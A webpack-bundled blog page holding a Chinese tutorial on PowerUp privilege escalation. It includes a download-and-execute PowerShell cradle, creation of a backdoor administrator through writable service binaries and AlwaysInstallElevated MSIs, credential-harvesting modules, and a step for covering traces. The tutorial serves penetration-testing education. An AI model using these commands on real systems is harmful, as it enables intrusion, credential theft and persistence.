(window.webpackJsonp=window.webpackJsonp||[]).push([[286],{578:function(e,s,a){"use strict";a.r(s);var t=a(7),n=Object(t.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"powershell工具之powerup详解实录"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#powershell工具之powerup详解实录"}},[e._v("#")]),e._v(" PowerShell工具之Powerup详解实录")]),e._v(" "),s("p",[s("strong",[e._v("0×01. Powerup简介")])]),e._v(" "),s("p",[e._v("Powerup是本地特权提升的一些调用方法，功能相当强大，拥有众多实用的脚本来帮助我们寻找目标主机Windows服务漏洞进行提权，也是 PowerShell Empire和PowerSploit 的一部分。")]),e._v(" "),s("p",[e._v("通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权；或者通过常见的系统服务，通过其继承的系统权限来完成提权等等，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。")]),e._v(" "),s("p",[e._v("首先我们来看下Powerup下都有哪些模块，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182112277.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v('输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用" Get-help [cmdlet] -full "来查看，比如" Get-Help Invoke-AllChecks -full "，如下图所示。')]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182153800.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("模块介绍：")]),e._v(" "),s("p",[e._v("1.Invoke-AllChecks")]),e._v(" "),s("p",[e._v("执行所有的脚本来检查。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Invoke-AllChecks\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182333424.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("2.Find-PathDLLHijack")]),e._v(" "),s("p",[e._v("检查当前%PATH%是否存在哪些目录是当前用户可以写入的。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Find-Pathdllhijack\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182421874.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("3.Get-ApplicationHost")]),e._v(" "),s("p",[e._v("从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>get-ApplicationHost\nPS C:>get-ApplicationHost | Format-Table -Autosize # 列表显示\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br")])]),s("p",[e._v("4.Get-RegistryAlwaysInstallElevated")]),e._v(" "),s("p",[e._v("检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Get-RegistryAlwaysInstallElevated\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("5.Get-RegistryAutoLogon")]),e._v(" "),s("p",[e._v("检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Get-RegistryAutoLogon\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("6.Get-ServiceDetail")]),e._v(" "),s("p",[e._v("返回某服务的信息。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182613965.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("7.Get-ServiceFilePermission")]),e._v(" "),s("p",[e._v("检查当前用户能够在哪些服务的目录写入相关联的可执行文件，通过这些文件可达到提权的目的。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("C:> Get-ServiceFilePermission\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182725492.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("8.Test-ServiceDaclPermission")]),e._v(" "),s("p",[e._v("检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则返回该服务对象。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Test-ServiceDaclPermission\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("9.Get-ServiceUnquoted")]),e._v(" "),s("p",[e._v("检查服务路径，返回包含空格但是不带引号的服务路径。")]),e._v(" "),s("p",[e._v("此处利用的windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升。")]),e._v(" "),s("p",[e._v("比如C:program fileshello.exe ,会被解释为C:program.exe以及C:program fileshello.exe")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Get-ServiceUnquoted\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108182829822.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("10.Get-UnattendedInstallFile")]),e._v(" "),s("p",[e._v("检查几个路径，查找是否存在这些文件，在这些文件里可能包含有部署凭据。这些文件包括：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("c:sysprepsysprep.xml\nc:sysprepsysprep.inf\nc:sysprep.inf\nc:windowsPantherUnattended.xml\nc:windowsPantherUnattendUnattended.xml\nc:windowsPantherUnattend.xml\nc:windowsPantherUnattendUnattend.xml\nc:windowsSystem32Sysprepunattend.xml\nc:windowsSystem32SysprepPantherunattend.xml\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br")])]),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Get-UnattendedInstallFile\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("11.Get-ModifiableRegistryAutoRun")]),e._v(" "),s("p",[e._v("检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径。")]),e._v(" "),s("p",[e._v("注册表检查的键值为：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun\nHKLMSoftwareMicrosoftWindowsCurrentVersionRunOnce\nHKLMSOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionRun\nHKLMSOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionRunOnce\nHKLMSOFTWAREMicrosoftWindowsCurrentVersionRunService\nHKLMSOFTWAREMicrosoftWindowsCurrentVersionRunOnceService\nHKLMSOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionRunService\nHKLMSOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionRunOnceService\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br")])]),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Get-ModifiableRegistryAutoRun\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183018472.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("12.Get-ModifiableScheduledTaskFile")]),e._v(" "),s("p",[e._v("返回当前用户能够修改的计划任务程序的名称和路径。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>Get-ModifiableScheduledTaskFile\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183203911.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("13.Get-Webconfig")]),e._v(" "),s("p",[e._v("返回当前服务器上的web.config文件中的数据库连接字符串的明文。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:>get-webconfig\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183304418.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("14.Invoke-ServiceAbuse")]),e._v(" "),s("p",[e._v("用来通过修改服务添加用户到指定组，并可以通过定制-cmd参数触发添加用户的自定义命令。")]),e._v(" "),s("p",[e._v("执行方式:")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v('PS C:> Invoke-ServiceAbuse -ServiceName VulnSVC # 添加默认账号\nPS C:> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName "TESTLABjohn" # 指定添加域账号\nPS C:> Invoke-ServiceAbuse -ServiceName VulnSVC -UserName backdoor -Password password -LocalGroup "Administrators" # 指定添加用户，用户密码以及添加的用户组。\nPS C:> Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..."# 自定义执行命令\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br")])]),s("p",[e._v("15.Restore-ServiceBinary")]),e._v(" "),s("p",[e._v("恢复服务的可执行文件到原始目录。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Restore-ServiceBinary -ServiceName VulnSVC\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("16.Test-ServiceDaclPermission")]),e._v(" "),s("p",[e._v("检查某个用户是否在一个服务有自由访问控制的权限，返回true或false。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Restore-ServiceBinary -ServiceName VulnSVC\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("17.Write-HijackDll")]),e._v(" "),s("p",[e._v("输出一个自定义命令并且能够自删除的bat文件到$env:Tempdebug.bat，并输出一个能够启动这个bat文件的dll。")]),e._v(" "),s("p",[e._v("18.Write-UserAddMSI")]),e._v(" "),s("p",[e._v("生成一个安装文件，运行这个安装文件，则弹出添加用户的框。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("PS C:> Write-UserAddMSI\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183502658.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("19.Write-ServiceBinary")]),e._v(" "),s("p",[e._v("预编译C#服务的可执行文件。默认创建一个默认管理员账号。可通过Command定制自己的命令。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v('PSC:>Write-ServiceBinary -ServiceName VulnSVC # 添加默认账号\nPSC:>Write-ServiceBinary -ServiceName VulnSVC -UserName "TESTLABjohn" # 指定添加域账号\nPSC:>Write-ServiceBinary-ServiceName VulnSVC -UserName backdoor -Password Password123! # 指定添加用户，用户密码以及添加的用户组\nPSC:> Write-ServiceBinary -ServiceName VulnSVC -Command "net ..." # 自定义执行命令\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br")])]),s("p",[e._v("20.Install-ServiceBinary")]),e._v(" "),s("p",[e._v("通过Write-ServiceBinary写一个C#的服务用来添加用户。")]),e._v(" "),s("p",[e._v("执行方式：")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v('PSC:> Install-ServiceBinary -ServiceName DHCP\nPSC:> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLABjohn"\nPSC:>Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!\nPSC:> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br")])]),s("p",[e._v("Write-ServiceBinary与Install-ServiceBinary不同的是前者生成可执行文件，后者直接安装服务。")]),e._v(" "),s("p",[s("strong",[e._v("0×02.使用module渗透实例")])]),e._v(" "),s("p",[e._v("模块很多不能一一介绍，有针对性的介绍几个常用模块的实战应用。")]),e._v(" "),s("p",[e._v("1.Invoke-AllChecks，Install-ServiceBinary，Get-ServiceUnquoted,Test-ServiceDaclPermission,Restore-ServiceBinary")]),e._v(" "),s("p",[e._v("先加载Powerup脚本，然后执行Invoke-AllChecks，脚本将会进行所有的检查。")]),e._v(" "),s("p",[e._v("使用IEX下载在内存中加载此脚本，执行如下命令，脚本将会进行所有的检查，如下图所示。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.247/PowerUp.ps1');Invoke-AllChecks”\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("温习下知识点：")]),e._v(" "),s("p",[e._v("-NoProfile(-NoP)：PowerShell控制台不加载当前用户的配置")]),e._v(" "),s("p",[e._v("-Exec Bypass:绕过执行安全策略")]),e._v(" "),s("p",[e._v("Import-Module：加载脚本")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183718346.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("也可以另一种方法，将Powerup脚本上传至目标服务器，再使用本地执行该脚本。见下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010818381243.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("上传好脚本后，输入shell命令进入CMD提示符下，在CMD环境下，使用本地隐藏权限绕过执行该脚本，见下图所示。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v('powershell.exe -exec bypass -Command "& {Import-Module .PowerUp.ps1; Invoke-AllChecks}"\n')])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108183933173.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("可以看出，Powerup列出了可能存在问题的所有服务，并在AbuseFunction中直接给出了利用方式。第一部分通过Get-ServiceUnquoted模块（利用windows的一个逻辑漏洞，即当文件包含空格时，windows API会解释为两个路径，并将这两个文件同时执行，有些时候可能会造成权限的提升）检测出了有“Vulnerable Service”、“OmniServ”、“OmniServer”、“OmniServers”四个服务存在此逻辑漏洞，但是都没有写入权限，所以并不能被我们利用来提权。第二部分通过Test-ServiceDaclPermission模块（检查所有可用的服务，并尝试对这些打开的服务进行修改，如果可修改，则存在此漏洞）检测出当前用户可以在“OmniServers”服务的目录写入相关联的可执行文件，并且通过这些文件来进行提权。")]),e._v(" "),s("p",[e._v("漏洞利用原理：Windows系统服务文件在操作系统启动时会加载执行，并且在后台调用可执行文件。比如，JAVA升级程序，每次重启系统时，JAVA升级程序会检测Oracle网站，是否有新版JAVA程序。而类似JAVA程序之类的系统服务程序加载时往往都是运行在系统权限上的。所以如果一个低权限的用户对于此类系统服务调用的可执行文件具有可写的权限，那么就可以将其替换成我们的恶意可执行文件，从而随着系统启动服务而获得系统权限。")]),e._v(" "),s("p",[e._v("这里我们可以使用icacls（Windows内建的一个工具，用来检查对有漏洞目录是否有写入的权限）来验证下PowerUp脚本检测是否正确，我们先来测试“C:Program FilesExecutable.exe”、“C:Program FilesCommon Filesmicrosoft sharedOmniServ.exe”、“C:Program FilesCommon FilesA SubfolderOmniServer.exe”这三个文件夹，均提示权限不够。如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184114211.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("再测试“C:Program FilesProgram FolderA SubfolderOmniServers.exe”文件，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184156830.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("“Everyone”用户对这个文件有完全控制权，就是说所有用户都具有全部权限修改这个文件夹。")]),e._v(" "),s("p",[e._v("参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。这意味着对该目录有读，写，删除其下的文件，删除该目录下的子目录的权限。")]),e._v(" "),s("p",[e._v("在这里我们使用AbuseFunction那里已经给出的具体操作方式，执行如下命令操作，如下图所示。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("知识点：")]),e._v(" "),s("p",[e._v("Install-ServiceBinary模块，通过Write-ServiceBinary写一个C#的服务用来添加用户。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184508185.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("之后当管理员运行该服务的时候，则会添加我们的账号。现在我们手动停止该服务并再启动该服务，就会添加我们的用户，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184548906.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("可以看到，提示拒绝访问，那是因为我们当前的权限是一个受限的USER权限，所以只能等待管理员运行该服务或者系统重启。这里因为是虚拟机机，所以直接使用如下命令强制重启，如下图所示。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("Shutdown –r –f –t 0\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010818464890.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("我们切换到目标机界面可以看到已经关机重启了，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184805211.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("重启以后，系统会自动创建了一个新的用户shuteer，密码是Password123!。如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184837655.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("我们来查看下该用户权限，该用户已经是系统管理员。如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184919907.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("提权成功以后，我们到目标机C:Program FilesProgram FolderA Subfolder目录下面可以看到多了一个文件，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108184953505.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("提权成功以后我们需要清除入侵的痕迹，把所有的状态恢复到最初的状态，可以使用如下命令恢复。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[e._v("'OmniServers'")]),e._v(" "),s("p",[e._v("l 恢复‘C:Program FilesProgram FolderA SubfolderOmniServers.exe.bak’为’C:Program FilesProgram FolderA SubfolderOmniServers.exe’")]),e._v(" "),s("p",[e._v("l 移除备份二进制文件‘C:Program FilesProgram FolderA SubfolderOmniServers.exe.bak’")]),e._v(" "),s("p",[e._v("2.Get-RegistryAlwaysInstallElevated，Write-UserAddMSI")]),e._v(" "),s("p",[e._v("使用Powerup的Get-RegistryAlwaysInstallElevated模块来检查注册表项是否被设置，如果AlwaysInstallElevated注册表项被设置，意味着的MSI文件是以system权限运行的。命令如下，True表示已经设置，如下图所示。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br")])]),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108185222820.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("接着添加用户，运行Write-UserAddMSI模块，运行后生成文件UserAdd.msi，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108185255662.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("这时以普通用户权限运行这个UserAdd.msi，就会成功添加账户，如下图所示。")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108185322476.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("我们在查看下管理员组的成员，可以看到已经成功在普通权限的CMD下添加了一个管理员账户。如下图所示。")]),e._v(" "),s("p",[e._v("漏洞利用原理：该漏洞产生的原因是因为用户开启了windows installer特权安装功能，设置的方法如下图所示：")]),e._v(" "),s("p",[e._v("打开组策略编辑器（运行框中输入gpedit.msc）")]),e._v(" "),s("p",[e._v("A.组策略－计算机配置—管理模版—Windows组件—Windows Installer—永远以高特权进行安装：选择启用")]),e._v(" "),s("p",[e._v("B.组策略－用户配置—管理模版－Windows组件—Windows Installer－永远以高特权进行安装：选择启用")]),e._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190108185409902.png",loading:"lazy"}})]),e._v(" "),s("p",[e._v("设置完毕之后，会在两个注册表如下位置自动创建键值为”1″。")]),e._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[e._v("[HKEY_CURRENT_USERSOFTWAREPoliciesMicrosoftWindowsInstaller] “AlwaysInstallElevated”=dword:00000001\n\n[HKEY_LOCAL_MACHINESOFTWAREPoliciesMicrosoftWindowsInstaller] “AlwaysInstallElevated”=dword:00000001\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br")])]),s("p",[e._v("防护：对照利用方法进行防御，只要关闭AlwaysInstallElevated，即可阻止通过msi文件的提权利用。")]),e._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[e._v("#")]),e._v(" 写在最后")]),e._v(" "),s("blockquote",[s("p",[e._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[e._v("冰河技术")]),e._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[e._v("冰河技术")]),e._v(" 